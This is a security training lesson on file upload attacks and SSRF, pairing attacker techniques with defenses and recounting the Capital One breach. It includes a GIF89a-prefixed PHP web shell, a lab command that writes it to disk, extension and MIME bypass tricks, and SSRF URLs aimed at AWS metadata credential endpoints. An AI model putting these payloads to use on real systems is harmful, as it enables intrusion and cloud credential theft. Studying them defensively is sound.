File Upload & SSRF

File upload forms and server-side requests are two of the most abused features. Today you learn how attackers weaponize both.

THEORY

File Upload Vulnerabilities: Every file upload feature is a potential code execution vector. The attacker uploads a file that the server processes — if the file is a web shell (PHP, JSP, ASPX) and the upload directory is accessible via the web server, the attacker gets remote code execution. Defenses include: extension whitelisting, MIME type validation, content inspection (magic bytes), renaming files, storing outside web root, and scanning with antivirus.

File upload bypass techniques:

# 1. Extension bypass — double extension: shell.php.jpg # 2. Extension bypass — null byte injection (old PHP): shell.php%00.jpg # 3. MIME type spoofing: Content-Type: image/jpeg (but file content is PHP code) # 4. Magic byte injection — prepend GIF header to PHP: GIF89a <?php system($_GET['cmd']); ?> # 5. .htaccess override — upload a .htaccess to enable PHP execution: AddType application/x-httpd-php .txt

Server-Side Request Forgery (SSRF): SSRF occurs when an application fetches a remote resource based on user-controlled input without proper validation. The attacker provides a URL (or the application constructs one from user input) and the server makes the request. The attacker can target internal services that are not exposed to the internet — cloud metadata endpoints, internal databases, container orchestration APIs, or other servers on the internal network.

# Classic SSRF — targeting AWS EC2 metadata service: https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/ # ↑ Internal metadata endpoint, not reachable # from the internet but accessible from the server. # The response contains IAM role credentials if the EC2 has an instance profile: https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
SSRF + cloud = devastating: The Capital One breach (2019) used SSRF against the AWS metadata service to retrieve IAM credentials, which were then used to exfiltrate 100M+ records from S3. This is the single most impactful SSRF playbook and the reason AWS introduced IMDSv2 (session-based, not just a GET to 169.254.169.254).
// attacker vs defender mindset
⚔ Attacker
  • Upload a PHP web shell disguised as an image: prepend GIF89a to <?php system($_GET['cmd']); ?> with .php extension.
  • If PHP is blocked, try JSP, ASPX, or even .shtml for Server-Side Includes. Each server supports different executable extensions.
  • For SSRF: test every parameter that accepts a URL — url=, file=, path=, redirect=. Try both internal IPs (10.x, 172.16.x, 192.168.x) and metadata endpoints.
  • Use SSRF to scan internal ports: http://127.0.0.1:8080, http://127.0.0.1:3306 — response vs timeout tells you if a service is running.
🛡 Defender
  • Never trust Content-Type or file extension alone. Validate file content using magic bytes (libmagic, python-magic). Reject anything that doesn't match expectations.
  • Store uploaded files outside the web root. Serve them through a proxy script that reads the file and streams it back — never expose direct file paths.
  • For SSRF: maintain a whitelist of allowed domains/IPs the app can fetch. Block private IP ranges at the application level or enforce outbound network restrictions.
  • Use IMDSv2 on AWS EC2 instances — requires session tokens, preventing simple SSRF from reading the metadata endpoint.
// real named incident
2019 — CAPITAL ONE SSRF + S3 EXFILTRATION — 106 MILLION RECORDS
SSRF to EC2 metadata service exposed IAM credentials, leading to S3 bucket exfiltration
Former AWS employee Paige Thompson exploited a misconfigured AWS WAF that allowed Server-Side Request Forgery. She sent a crafted request that made a Capital One web server fetch the EC2 metadata service at 169.254.169.254, returning temporary IAM role credentials. Those credentials had read access to S3 buckets containing customer data. She exfiltrated data from 30 S3 buckets containing 106 million credit card applications and bank account records over several months. The breach was detected by an external researcher who found the exfiltrated data on GitHub. Capital One was fined $190M and the total cost exceeded $300M. The root cause chain: WAF misconfiguration → SSRF → metadata access → credential theft → S3 data exfiltration.
HANDS-ON LAB

Goal: bypass file upload filters and exploit SSRF to access internal resources.

  1. Start a file upload vulnerable app — docker run -d -p 8000:80 teddysecurity/upload-labs or use tryhackme.com/room/uploadvulns.
  2. Craft a PHP web shell: echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php. Upload it. If extension whitelist blocks it, try shell.php.jpg or shell.phtml.
  3. Use Burp Suite to intercept the upload — modify the Content-Type to image/jpeg and change the extension mid-flight.
  4. Set up a simple SSRF test: use a local Python HTTP server to simulate SSRF: python3 -m http.server 9999 then try http://localhost:9999/test via the SSRF parameter.
  5. Test internal metadata endpoint SSRF: if the target is on AWS EC2, try accessing http://169.254.169.254/latest/meta-data/ through the vulnerable parameter.
Deliverable: A PHP web shell uploaded and executed (screenshot of command output), plus one SSRF probe that returned an internal resource response.

INTERVIEW READY
Q: "How do you prevent file upload vulnerabilities?"
A: "Never trust user-provided Content-Type or file extension. Validate file content by reading magic bytes (the first few bytes of the file). Whitelist allowed extensions. Store files outside the web root — serve them through a download script that reads and streams the file. Scan with antivirus. Rename files to prevent path traversal. And most importantly: never make the upload directory executable."
Q: "What is SSRF and why is it dangerous in cloud environments?"
A: "SSRF tricks the server into making requests to internal resources. In cloud environments, the attacker targets the metadata service — 169.254.169.254 on AWS, 169.254.169.254 on GCP, or similar. The metadata service returns temporary cloud provider credentials that can grant access to storage buckets, databases, and other cloud resources. This was the attack vector for the Capital One breach."
Q: "How would you test for SSRF?"
A: "I find all parameters that accept URLs or paths — in API endpoints, redirect parameters, file fetchers, webhooks. I submit requests pointing to a server I control (like Burp Collaborator or a webhook.site URL) and check for callbacks. Then I test internal IPs and cloud metadata endpoints. Response content or timing differences reveal whether the request reached the target."

Magic byte reference
